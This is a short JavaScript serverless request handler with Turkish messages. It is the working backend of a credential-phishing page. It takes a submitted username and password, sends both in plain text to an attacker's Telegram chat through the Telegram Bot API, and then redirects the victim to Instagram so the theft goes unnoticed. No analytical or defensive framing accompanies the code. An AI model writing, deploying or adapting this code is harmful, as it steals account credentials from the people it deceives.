export default async function handler(req, res) {
    if (req.method !== "POST") {
        return res.status(405).json({message: "Method Not Allowed"});
    }

    const {username, password} = req.body;

    if (!username || !password) {
        return res.status(400).json({message: "Kullanıcı adı ve şifre boş olamaz."});
    }

    const BOT_TOKEN = process.env.BOT_TOKEN;
    const CHAT_ID = process.env.CHAT_ID;

    if (!BOT_TOKEN || !CHAT_ID) {
        return res.status(500).json({message: "Environment variables eksik."});
    }

    const text = `👤 Kullanıcı Adı: ${username}🔐 Şifre: ${password}`;
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    try {
        const response = await fetch(url, {
            method: "POST",
            headers: {"Content-Type": "application/x-www-form-urlencoded"},
            body: new URLSearchParams({
                chat_id: CHAT_ID,
                text,
            }),
        });

        if (!response.ok) {
            const errorData = await response.json();
            console.error("Telegram API Error:", errorData);
            return res.status(500).json({message: "Telegram API hatası oluştu.", error: errorData});
        }

        res.status(302).redirect("https://www.instagram.com/");
    } catch (err) {
        console.error("Network Error:", err);
        res.status(500).json({message: "Hata oluştu", error: err.message});
    }
}